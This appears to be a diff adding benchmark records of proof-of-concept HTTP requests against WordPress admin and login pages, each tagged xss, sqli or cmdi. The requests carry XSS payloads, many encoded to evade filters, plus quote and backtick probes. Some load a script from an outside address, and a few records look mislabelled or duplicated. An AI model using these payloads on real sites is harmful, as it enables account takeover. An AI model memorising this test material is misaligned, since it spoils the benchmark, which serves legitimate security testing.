+      "action": [
+        "<script>xss(80941049)</script>"
+      ],
+      "action2": [
+        "<script>xss(60968227)</script>"
+      ],
+      "changeit2": [
+        "Change"
+      ],
+      "new_role": [
+        "<script>xss(27874769)</script>"
+      ],
+      "new_role2": [
+        "<script>xss(3767872)</script>"
+      ],
+      "paged": [
+        "<script>xss(85677271)</script>"
+      ],
+      "s": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ]
+    },
+    "request_id": "requests.69416364c4704",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_c26e69",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/wp-login.php",
+    "post_data": {},
+    "query_params": {
+      "action": [
+        "1%3Cscript%3Ealert%28987890%29%3C/script%3E"
+      ],
+      "redirect_to": [
+        "<br /><b>Warning</b>:  main() [echo]: Attempt to echo a string that might be tainted in <b>/var/www/html/wp-login.php</b> on line <b>1540</b><br />http://10.176.36.21:50015/wp-admin/"
+      ],
+      "remind_me_later": [
+        "61ab6272b0"
+      ]
+    },
+    "request_id": "requests.6941638ee2d02",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_c7ee2c",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/wp-admin/load-styles.php",
+    "post_data": {},
+    "query_params": {
+      "c": [
+        "0"
+      ],
+      "dir": [
+        "ltr"
+      ],
+      "load[chunk_0]": [
+        "url(\"data:image/jpg;base64,</style><svg/onload=alert(987890)>\")"
+      ],
+      "load[chunk_1]": [
+        "nter,widgets,site-icon,l10n,buttons,wp-auth-check"
+      ],
+      "ver": [
+        "6.6.4"
+      ]
+    },
+    "request_id": "requests.69416386b2342",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_cbe1c2",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/wp-admin/edit-tags.php",
+    "post_data": {},
+    "query_params": {
+      "order": [
+        "desc"
+      ],
+      "orderby": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "taxonomy": [
+        "post_tag"
+      ]
+    },
+    "request_id": "requests.6941635b54806",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_cd40dc",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/wp-admin/edit-tags.php",
+    "post_data": {},
+    "query_params": {
+      "order": [
+        "desc"
+      ],
+      "orderby": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "taxonomy": [
+        "post_tag"
+      ]
+    },
+    "request_id": "requests.6941635b54806",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_cdddf0",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/options.php",
+    "post_data": {
+      "WPLANG": [
+        "</title></option><script>xss(94214553)</script>"
+      ],
+      "_wp_http_referer": [
+        "/wp-admin/options-general.php?highlight=confirm_admin_email"
+      ],
+      "_wpnonce": [
+        "fde880e94c"
+      ],
+      "action": [
+        "update"
+      ],
+      "blogdescription": [
+        "</title></option><script>xss(26348834)</script>"
+      ],
+      "blogname": [
+        "</title></option><script>xss(61144120)</script>"
+      ],
+      "date_format": [
+        "\""
+      ],
+      "date_format_custom": [
+        "</title></option><script>xss(8202411)</script>"
+      ],
+      "default_role": [
+        "</title></option><script>xss(15062401)</script>"
+      ],
+      "home": [
+        "xuefeng20011024"
+      ],
+      "new_admin_email": [
+        "</title></option><script>xss(19409198)</script>"
+      ],
+      "option_page": [
+        "general"
+      ],
+      "site_icon": [
+        "0"
+      ],
+      "siteurl": [
+        "xuefeng20011024"
+      ],
+      "start_of_week": [
+        "</title></option><script>xss(6712605)</script>"
+      ],
+      "submit": [
+        "Save Changes"
+      ],
+      "time_format": [
+        "</title></option><script>xss(88766034)</script>"
+      ],
+      "time_format_custom": [
+        "</title></option><script>xss(61169035)</script>"
+      ],
+      "timezone_string": [
+        "</title></option><script>xss(23864185)</script>"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.6941635a65c3a",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_ce54d0",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/wp-admin/customize.php",
+    "post_data": {},
+    "query_params": {
+      "addnew": [
+        "1"
+      ],
+      "base": [
+        "media_gallery"
+      ],
+      "editwidget": [
+        "media_gallery-1"
+      ],
+      "id": [
+        "theme"
+      ],
+      "num": [
+        "2"
+      ],
+      "return": [
+        "/wp-admin/themes.php"
+      ],
+      "theme": [
+        "%22%3E%3Ca%20href%3Djavascrip%26%23116%3B%3Aalert%28987890%29%3B%3E1%3C/a%3E"
+      ]
+    },
+    "request_id": "requests.681c5716d2b9c",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_cfe6d1",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/comment.php",
+    "post_data": {
+      "_wp_http_referer": [
+        "/wp-admin/comment.php?action=editcomment&c=1"
+      ],
+      "_wp_original_http_referer": [
+        ""
+      ],
+      "_wpnonce": [
+        "9850a830cd"
+      ],
+      "aa": [
+        "123"
+      ],
+      "action": [
+        "editedcomment"
+      ],
+      "c": [
+        "1"
+      ],
+      "closedpostboxesnonce": [
+        "5c2858d17b"
+      ],
+      "comment_ID": [
+        "1"
+      ],
+      "comment_post_ID": [
+        "1"
+      ],
+      "comment_status": [
+        "1"
+      ],
+      "content": [
+        "xuefeng20011024"
+      ],
+      "cur_aa": [
+        "2025"
+      ],
+      "cur_hh": [
+        "23"
+      ],
+      "cur_jj": [
+        "09"
+      ],
+      "cur_mm": [
+        "12"
+      ],
+      "cur_mn": [
+        "14"
+      ],
+      "hh": [
+        "123"
+      ],
+      "hidden_aa": [
+        "2025"
+      ],
+      "hidden_hh": [
+        "09"
+      ],
+      "hidden_jj": [
+        "11"
+      ],
+      "hidden_mm": [
+        "02"
+      ],
+      "hidden_mn": [
+        "45"
+      ],
+      "jj": [
+        "123"
+      ],
+      "mm": [
+        "01"
+      ],
+      "mn": [
+        "123"
+      ],
+      "newcomment_author": [
+        "xuefeng20011024"
+      ],
+      "newcomment_author_email": [
+        "xuefeng20011024"
+      ],
+      "newcomment_author_url": [
+        "xuefeng20011024"
+      ],
+      "noredir": [
+        "1"
+      ],
+      "p": [
+        "1"
+      ],
+      "referredby": [
+        "1%3Cscript%3Ealert%28987890%29%3C/script%3E"
+      ],
+      "save": [
+        "Update"
+      ],
+      "ss": [
+        "35"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.694163834ca83",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_d4be09",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/options.php",
+    "post_data": {
+      "_wp_http_referer": [
+        "/wp-admin/options-discussion.php"
+      ],
+      "_wpnonce": [
+        "1f89f926a2"
+      ],
+      "action": [
+        "update"
+      ],
+      "close_comments_days_old": [
+        "123"
+      ],
+      "close_comments_for_old_posts": [
+        "1"
+      ],
+      "comment_max_links": [
+        "123"
+      ],
+      "comment_moderation": [
+        "1"
+      ],
+      "comment_order": [
+        "asc"
+      ],
+      "comment_previously_approved": [
+        "1"
+      ],
+      "comment_registration": [
+        "1"
+      ],
+      "comments_notify": [
+        "1"
+      ],
+      "comments_per_page": [
+        "123"
+      ],
+      "default_comment_status": [
+        "open"
+      ],
+      "default_comments_page": [
+        "newest"
+      ],
+      "default_ping_status": [
+        "open"
+      ],
+      "default_pingback_flag": [
+        "1%3Cscr%3C%21--%20--%3Eipt%3Ealert%28987890%29%3C/scr%3C%21--%20--%3Eipt%3E"
+      ],
+      "disallowed_keys": [
+        "xuefeng20011024"
+      ],
+      "moderation_keys": [
+        "xuefeng20011024"
+      ],
+      "moderation_notify": [
+        "1"
+      ],
+      "option_page": [
+        "discussion"
+      ],
+      "page_comments": [
+        "1"
+      ],
+      "require_name_email": [
+        "1"
+      ],
+      "show_avatars": [
+        "1"
+      ],
+      "show_comments_cookies_opt_in": [
+        "1"
+      ],
+      "submit": [
+        "Save Changes"
+      ],
+      "thread_comments": [
+        "1"
+      ],
+      "thread_comments_depth": [
+        "2"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.694163a8d30ed",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_d62c83",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/edit-comments.php",
+    "post_data": {
+      "var wpLinkL10n ": [
+        "{\"title\":\"Insert\\/edit link\",\"update\":\"Update\",\"save\":\"Add Link\",\"noTitle\":\"(no title)\",\"noMatchesFound\":\"No results found.\",\"linkSelected\":\"Link selected.\",\"linkInserted\":\"Link inserted.\",\"minInputLength\":\"3\"};"
+      ]
+    },
+    "query_params": {
+      "ids": [
+        "\"><svg onload=alert(987890)//"
+      ],
+      "trashed": [
+        "1"
+      ]
+    },
+    "request_id": "requests.681c582fabefb",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_dd9437",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/wp-admin/edit-comments.php",
+    "post_data": {},
+    "query_params": {
+      "_ajax_fetch_list_nonce": [
+        "5aa52a1157"
+      ],
+      "_page": [
+        "1"
+      ],
+      "_per_page": [
+        "123"
+      ],
+      "_total": [
+        "1"
+      ],
+      "action": [
+        "-1"
+      ],
+      "action2": [
+        "-1"
+      ],
+      "comment_status": [
+        "all"
+      ],
+      "comment_type": [
+        "1%3Cscr%3C%21--%20--%3Eipt%3Ealert%28987890%29%3C/scr%3C%21--%20--%3Eipt%3E"
+      ],
+      "paged": [
+        "1"
+      ],
+      "pagegen_timestamp": [
+        "2025-12-09 22:19:02"
+      ],
+      "s": [
+        "xuefeng20011024"
+      ]
+    },
+    "request_id": "requests.6941635d81ce5",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_e05743",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-login.php",
+    "post_data": {
+      "redirect_to": [
+        "%22%3E%3Ca%20href%3Djavascrip%26%23116%3B%3Aalert%28987890%29%3B%3E1%3C/a%3E"
+      ],
+      "user_login": [
+        "<script src=\"http://172.31.0.1:37475/f9a22431-6397-45bd-9640-82bd88192623\"></script>"
+      ],
+      "wp-submit": [
+        "Get New Password"
+      ]
+    },
+    "query_params": {
+      "action": [
+        "lostpassword"
+      ]
+    },
+    "request_id": "requests.6819ca1e80c7e",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_e0c7c6",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-login.php",
+    "post_data": {
+      "log": [
+        "xuefeng20011024"
+      ],
+      "pwd": [
+        "xuefeng20011024"
+      ],
+      "redirect_to": [
+        "\"><svg onload=alert(987890)//"
+      ],
+      "testcookie": [
+        "1"
+      ],
+      "wp-submit": [
+        "Log In"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.6941631eef633",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_e3388d",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/index.php/wp-json/wp/v2/types/post",
+    "post_data": {},
+    "query_params": {
+      "context": [
+        "sqli%2527"
+      ]
+    },
+    "request_id": "requests.6941638f6df9f",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_e4d56d",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/comment.php",
+    "post_data": {
+      "_wp_http_referer": [
+        "/wp-admin/comment.php?action=editcomment&c=1"
+      ],
+      "_wp_original_http_referer": [
+        ""
+      ],
+      "_wpnonce": [
+        "9850a830cd"
+      ],
+      "aa": [
+        "123"
+      ],
+      "action": [
+        "editedcomment"
+      ],
+      "c": [
+        "1"
+      ],
+      "closedpostboxesnonce": [
+        "5c2858d17b"
+      ],
+      "comment_ID": [
+        "1"
+      ],
+      "comment_post_ID": [
+        "1"
+      ],
+      "comment_status": [
+        "1"
+      ],
+      "content": [
+        "xuefeng20011024"
+      ],
+      "cur_aa": [
+        "2025"
+      ],
+      "cur_hh": [
+        "23"
+      ],
+      "cur_jj": [
+        "09"
+      ],
+      "cur_mm": [
+        "12"
+      ],
+      "cur_mn": [
+        "14"
+      ],
+      "hh": [
+        "123"
+      ],
+      "hidden_aa": [
+        "2025"
+      ],
+      "hidden_hh": [
+        "09"
+      ],
+      "hidden_jj": [
+        "11"
+      ],
+      "hidden_mm": [
+        "02"
+      ],
+      "hidden_mn": [
+        "45"
+      ],
+      "jj": [
+        "'"
+      ],
+      "mm": [
+        "01"
+      ],
+      "mn": [
+        "123"
+      ],
+      "newcomment_author": [
+        "xuefeng20011024"
+      ],
+      "newcomment_author_email": [
+        "xuefeng20011024"
+      ],
+      "newcomment_author_url": [
+        "xuefeng20011024"
+      ],
+      "noredir": [
+        "1"
+      ],
+      "p": [
+        "1"
+      ],
+      "referredby": [
+        ""
+      ],
+      "save": [
+        "Update"
+      ],
+      "ss": [
+        "35"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.69416382602ab",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_e6283f",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-login.php",
+    "post_data": {
+      "redirect_to": [
+        "1<scr<!--<!--%20-->%20-->ipt>alert(987890)</scr<!--<!--%20-->%20-->ipt>"
+      ],
+      "user_login": [
+        "<script src=\"http://172.31.0.1:37475/f9a22431-6397-45bd-9640-82bd88192623\"></script>"
+      ],
+      "wp-submit": [
+        "Get New Password"
+      ]
+    },
+    "query_params": {
+      "action": [
+        "lostpassword"
+      ]
+    },
+    "request_id": "requests.6819ca1e80c7e",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_e9a7ba",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/export.php",
+    "post_data": {
+      "WHERE ( comment_approved ": [
+        "'post-trashed' )"
+      ]
+    },
+    "query_params": {
+      "attachment_end_date": [
+        "0"
+      ],
+      "attachment_start_date": [
+        "`"
+      ],
+      "cat": [
+        "0"
+      ],
+      "content": [
+        "attachment"
+      ],
+      "download": [
+        "true"
+      ],
+      "page_author": [
+        "1"
+      ],
+      "page_end_date": [
+        "2025-02"
+      ],
+      "page_start_date": [
+        "2025-02"
+      ],
+      "page_status": [
+        "private"
+      ],
+      "post_author": [
+        "1"
+      ],
+      "post_end_date": [
+        "2025-02"
+      ],
+      "post_start_date": [
+        "2025-02"
+      ],
+      "post_status": [
+        "private"
+      ],
+      "submit": [
+        "Download Export File"
+      ]
+    },
+    "request_id": "requests.681c587c4039b",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_ea0665",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/wp-admin/edit-comments.php",
+    "post_data": {},
+    "query_params": {
+      "_ajax_fetch_list_nonce": [
+        "5aa52a1157"
+      ],
+      "_page": [
+        "1"
+      ],
+      "_per_page": [
+        "123"
+      ],
+      "_total": [
+        "1"
+      ],
+      "action": [
+        "\"><a%20href=javascrip%26%2338%3B%26%2335%3B%26%2349%3B%26%2349%3B%26%2354%3B%26%2359%3B:alert(987890);>1</a>"
+      ],
+      "action2": [
+        "-1"
+      ],
+      "comment_status": [
+        "all"
+      ],
+      "comment_type": [
+        ""
+      ],
+      "delete_comments[0]": [
+        "1"
+      ],
+      "paged": [
+        "1"
+      ],
+      "pagegen_timestamp": [
+        "2025-12-09 22:21:56"
+      ],
+      "s": [
+        "xuefeng20011024"
+      ]
+    },
+    "request_id": "requests.6941633b477a6",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_eccece",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/wp-admin/users.php",
+    "post_data": {},
+    "query_params": {
+      "action": [
+        "<script>xss(80941049)</script>"
+      ],
+      "action2": [
+        "<script>xss(60968227)</script>"
+      ],
+      "changeit2": [
+        "Change"
+      ],
+      "new_role": [
+        "<script>xss(27874769)</script>"
+      ],
+      "new_role2": [
+        "<script>xss(3767872)</script>"
+      ],
+      "paged": [
+        "<script>xss(85677271)</script>"
+      ],
+      "s": [
+        "%22%3E%3Ca%20href%3Djavascrip%26%23116%3B%3Aalert%28987890%29%3B%3E1%3C/a%3E"
+      ]
+    },
+    "request_id": "requests.69416364c4704",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_ee394c",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-login.php",
+    "post_data": {
+      "log": [
+        "xuefeng20011024"
+      ],
+      "pwd": [
+        "\"><a%20href=javascrip%26%2338%3B%26%2335%3B%26%2349%3B%26%2349%3B%26%2354%3B%26%2359%3B:alert(987890);>1</a>"
+      ],
+      "redirect_to": [
+        "http://10.176.36.21:50015/wp-admin/"
+      ],
+      "testcookie": [
+        "1"
+      ],
+      "wp-submit": [
+        "Log In"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.6941631ee38c0",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_ee3aa4",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/edit.php",
+    "post_data": {
+      "var heartbeatSettings ": [
+        "{\"nonce\":\"11edef0e22\"};"
+      ]
+    },
+    "query_params": {
+      "action": [
+        "trash"
+      ],
+      "action2": [
+        "trash"
+      ],
+      "cat": [
+        "1"
+      ],
+      "filter_action": [
+        "Filter"
+      ],
+      "m": [
+        "0"
+      ],
+      "paged": [
+        "1"
+      ],
+      "post[0]": [
+        "1"
+      ],
+      "post_status": [
+        "all"
+      ],
+      "post_type": [
+        "post"
+      ],
+      "s": [
+        "%22%3E%3Ca%20href%3Djavascrip%26%23116%3B%3Aalert%28987890%29%3B%3E1%3C/a%3E"
+      ]
+    },
+    "request_id": "requests.681c57a7b805f",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_ee3eff",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-login.php",
+    "post_data": {
+      "redirect_to": [
+        ""
+      ],
+      "user_login": [
+        "1<scr<!--<!--%20-->%20-->ipt>alert(987890)</scr<!--<!--%20-->%20-->ipt>"
+      ],
+      "wp-submit": [
+        "Get New Password"
+      ]
+    },
+    "query_params": {
+      "action": [
+        "lostpassword"
+      ]
+    },
+    "request_id": "requests.6819ca1ca6337",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_ee855b",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/wp-admin/edit-tags.php",
+    "post_data": {},
+    "query_params": {
+      "order": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "orderby": [
+        "name"
+      ],
+      "taxonomy": [
+        "post_tag"
+      ]
+    },
+    "request_id": "requests.6941635b0ea9e",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_efb4e4",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "GET",
+    "path": "/wp-admin/users.php",
+    "post_data": {},
+    "query_params": {
+      "role": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ]
+    },
+    "request_id": "requests.694163978250d",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_efef89",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/edit.php",
+    "post_data": {
+      "var heartbeatSettings ": [
+        "{\"nonce\":\"11edef0e22\"};"
+      ]
+    },
+    "query_params": {
+      "order": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "orderby": [
+        "date"
+      ],
+      "post_type": [
+        "page"
+      ]
+    },
+    "request_id": "requests.681c57f2dbaff",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_ff05e8",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "wordpress",
+    "application_name": "WordPress",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-wordpress-v0.1.0",
+    "method": "POST",
+    "path": "/wp-admin/options-permalink.php",
+    "post_data": {
+      "_wp_http_referer": [
+        "/wp-admin/options-permalink.php"
+      ],
+      "_wpnonce": [
+        "195f6ebb82"
+      ],
+      "category_base": [
+        "<a href=\"\" jaekpot-attribute=\"67934488\">jaekpot</a>"
+      ],
+      "permalink_structure": [
+        "<a href=\"\" jaekpot-attribute=\"32134419\">jaekpot</a>"
+      ],
+      "selection": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "submit": [
+        "Save Changes"
+      ],
+      "tag_base": [
+        "<a href=\"\" jaekpot-attribute=\"21973171\">jaekpot</a>"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.6941637e65191",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://github.com/WordPress/WordPress",
+    "vuln_id": "vuln_function_ff1591",
+    "vuln_type": "xss"
+  }
+]
